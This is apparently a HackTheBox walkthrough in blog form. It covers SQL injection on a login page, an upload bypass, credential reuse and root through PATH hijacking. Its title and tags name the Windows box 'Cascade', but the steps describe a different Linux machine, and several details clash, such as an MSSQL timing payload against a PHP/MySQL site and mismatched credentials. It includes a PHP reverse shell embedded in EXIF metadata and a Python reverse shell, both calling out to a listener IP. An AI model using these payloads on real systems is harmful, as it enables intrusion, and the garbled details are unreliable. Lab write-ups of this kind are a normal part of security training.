---
title: "HackTheBox: Cascade | Walkthrough"
date: 2020-09-26
categories: [hackthebox]
tags: [windows, active-directory, smb, ldap, privesc]
---

## Enumeration

Set the target IP:

```bash
export ipaddress=10.10.10.185
````

Run an Nmap scan:

```bash
ports=$(nmap -p- --min-rate=1000 -T4 $ipaddress | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -A -p$ports $ipaddress -o nmap
```

Results:

* **22/tcp**: OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
* **80/tcp**: Apache 2.4.29 (Ubuntu)

Only SSH and HTTP are open. Visiting `http://10.10.10.185/` shows a **portfolio site**.

Viewing the source reveals a hidden `login.php`.

---

## SQL Injection

Try basic credentials:

```
admin / admin
```

Fails.

Intercept the login request with Burp and save as `request.txt`.

Run SQLMap:

```bash
sqlmap -r request.txt -p username,password
```

It identifies a SQLi vulnerability and shows a redirect to `upload.php`.

Decoded payload example:

```
username=admin';WAITFOR DELAY '0:0:5'--
password=admin
```

Logging in with that grants access to the **file upload page**.

---

## File Upload Bypass & RCE

Test with a normal image → works. Uploaded to:

```
/images/uploads/mydog.png
```

### Attempt 1: PHP reverse shell disguised

```bash
cp /usr/share/laudanum/php/php-reverse-shell.php php-rev.php
vi php-rev.php   # change IP & port
mv php-rev.php php-rev.php.png
```

Upload fails with “what are you trying to do there?”.

### Attempt 2: PHP code in EXIF metadata

```bash
exiftool -Comment='<?php system("whoami"); ?>' mydog.jpg
mv mydog.jpg mydog.php.jpg
```

Upload → opening file executes code → returns `www-data`.

Now, craft a reverse shell:

```bash
exiftool -Comment='<?php $sock=fsockopen("10.10.14.168",4242);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes); ?>' mydog.php.jpg
```

Start listener:

```bash
nc -nvlp 4242
```

Open uploaded file → get reverse shell as `www-data`.

---

## User Privilege Escalation

Check the application files:

```bash
cd /var/www/Magic
cat db.php5
```

Credentials found:

```
User: theseus
Password: iamkingtheseus
```

Try switching user:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
su - theseus
```

Fails.

Dump database:

```bash
mysqldump Magic -u theseus -p
```

Password: `iamkingtheseus`

Dump reveals new creds:

```
admin / Th3s3usW4sK1ng
```

Switch user:

```bash
su - theseus
Password: Th3s3usW4sK1ng
```

Success!

Read user flag:

```bash
cat user.txt
```

---

## Root Privilege Escalation

Search SUID binaries:

```bash
find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
```

Interesting binary:

```
-rwsr-x--- 1 root users 22040 Oct 21  2019 /bin/sysinfo
```

`sysinfo` executes commands (`lshw`, `fdisk`, etc.) without full path. → PATH hijacking possible.

Create fake `lshw`:

```bash
cd /home/theseus
echo '#!/bin/bash' > lshw
echo 'bash' >> lshw
chmod +x lshw
export PATH=/home/theseus:$PATH
```

Run `sysinfo`:

```bash
sysinfo
```

Spawns root shell (though limited).

To get a proper reverse shell, use Python:

On attacker machine:

```bash
nc -nvlp 4444
```

On victim:

```bash
python3 -c "import os,pty,socket; s=socket.socket(); s.connect(('10.10.14.27',4444)); [os.dup2(s.fileno(),fd) for fd in (0,1,2)]; pty.spawn('/bin/bash')"
```

Now you have a **root shell**.

---

## Proof

```bash
whoami
cat /root/root.txt
```

Rooted ✅

